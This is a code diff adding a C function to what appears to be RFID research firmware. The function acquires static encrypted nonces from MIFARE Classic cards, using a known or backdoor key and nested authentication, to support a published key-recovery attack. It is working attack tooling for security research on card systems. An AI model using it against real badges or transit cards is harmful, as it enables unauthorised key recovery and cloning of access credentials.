@@ -1189,3 +1189,94 @@ uint8_t mf1_hardnested_nonces_acquire(bool slow, uint8_t blkKnown, uint8_t typKn
     // OK!
     return STATUS_HF_TAG_OK;
 }
+
+//-----------------------------------------------------------------------------
+// acquire static encrypted nonces in order to perform the attack described in
+// Philippe Teuwen, "MIFARE Classic: exposing the static encrypted nonce variant"
+//-----------------------------------------------------------------------------
+uint8_t mf1_static_encrypted_nonces_acquire(uint64_t keyKnown, uint8_t sector_count, uint8_t sector_data[40][sizeof(mf1_static_nonce_sector_t)], uint8_t *sectors_acquired) {
+    struct Crypto1State mpcs = {0, 0};
+    struct Crypto1State *pcs = &mpcs;
+    
+    uint8_t receivedAnswer[16] = {0x00};
+    uint8_t par_enc[4] = {0x00};
+    uint32_t cuid = 0;
+    bool have_uid = false;
+    
+    *sectors_acquired = 0;
+    
+    for (uint16_t sec = 0; sec < sector_count && sec < 40; sec++) {
+        uint16_t blockNo = (sec < 32) ? sec * 4 + 3 : 128 + (sec - 32) * 16 + 15;
+        
+        mf1_static_nonce_sector_t sector_nonces = {0};
+        
+        for (uint8_t keyType = 0; keyType < 2; keyType++) {
+            memset(par_enc, 0, sizeof(par_enc));
+            if (have_uid == false) {
+                if (pcd_14a_reader_scan_auto(p_tag_info) != STATUS_HF_TAG_OK) {
+                    return STATUS_HF_TAG_NO;
+                }
+                cuid = get_u32_tag_uid(p_tag_info);
+                have_uid = true;
+            } else {
+                if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) {
+                    return STATUS_HF_TAG_NO;
+                }
+            }
+            
+            uint32_t nt1 = 0;
+            if (authex(pcs, cuid, blockNo, 0x60 + keyType + 4, keyKnown, AUTH_FIRST, &nt1) != STATUS_HF_TAG_OK) {
+                return STATUS_MF_ERR_AUTH;
+            }
+
+            uint8_t cmd_status;
+            uint8_t res = send_cmd(pcs, AUTH_NESTED, 0x60 + keyType + 4, blockNo, &cmd_status, receivedAnswer, par_enc, sizeof(receivedAnswer) * 8);
+            if (res != 32) {
+                return STATUS_MF_ERR_AUTH;
+            }
+            
+            uint32_t nt_enc = bytes_to_num(receivedAnswer, 4);
+            crypto1_init(pcs, keyKnown);
+            uint32_t nt = crypto1_word(pcs, nt_enc ^ cuid, 1) ^ nt_enc;
+
+            uint16_t nt_first_half = nt >> 16;
+
+            if (pcd_14a_reader_fast_select(p_tag_info) != STATUS_HF_TAG_OK) {
+                return STATUS_HF_TAG_NO;
+            }
+
+            if (authex(pcs, cuid, blockNo, 0x60 + keyType + 4, keyKnown, AUTH_FIRST, &nt1) != STATUS_HF_TAG_OK) {
+                return STATUS_MF_ERR_AUTH;
+            }
+
+            res = send_cmd(pcs, AUTH_NESTED, 0x60 + keyType, blockNo, &cmd_status, receivedAnswer, par_enc, sizeof(receivedAnswer) * 8);
+            if (res != 32) {
+                return STATUS_MF_ERR_AUTH;
+            }
+
+            uint32_t nt_enc_final = bytes_to_num(receivedAnswer, 4);
+
+            uint8_t nt_par_err = ((par_enc[0] ^ oddparity8((nt_enc_final >> 24) & 0xFF)) << 3 |
+                                    (par_enc[1] ^ oddparity8((nt_enc_final >> 16) & 0xFF)) << 2 |
+                                    (par_enc[2] ^ oddparity8((nt_enc_final >> 8) & 0xFF)) << 1 |
+                                    (par_enc[3] ^ oddparity8((nt_enc_final >> 0) & 0xFF)));
+
+            if (keyType == 0) {
+                num_to_bytes(nt_first_half, 2, sector_nonces.key_a.nt_first_half);
+                sector_nonces.key_a.nt_par_err = nt_par_err;
+                num_to_bytes(nt_enc_final, 4, sector_nonces.key_a.nt_enc);
+            } else {
+                num_to_bytes(nt_first_half, 2, sector_nonces.key_b.nt_first_half);
+                sector_nonces.key_b.nt_par_err = nt_par_err;
+                num_to_bytes(nt_enc_final, 4, sector_nonces.key_b.nt_enc);
+            }
+        }
+
+        memcpy(sector_data[sec], &sector_nonces, sizeof(sector_nonces));
+        (*sectors_acquired)++;
+    }
+
+    crypto1_deinit(pcs);
+
+    return STATUS_HF_TAG_OK;
+}
